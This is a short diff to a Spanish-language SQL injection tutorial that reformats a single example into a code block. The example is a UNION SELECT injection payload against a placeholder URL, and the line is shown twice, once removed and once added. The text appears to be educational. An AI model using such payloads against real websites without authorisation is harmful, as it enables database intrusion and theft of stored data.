@@ -124,7 +124,9 @@ Ahora llega el turno de `union select`, lo que hacen estos comandos es "darnos p
 
 Para usar `union select`, tenos que poner el total de columnas que descubrimos anteriormente. Volviendo a el ejemplo que tenemos planteado, nos quedaría de la siguiente manera:
 
-`http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+`
+```
+http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 --+
+```
 
 
 
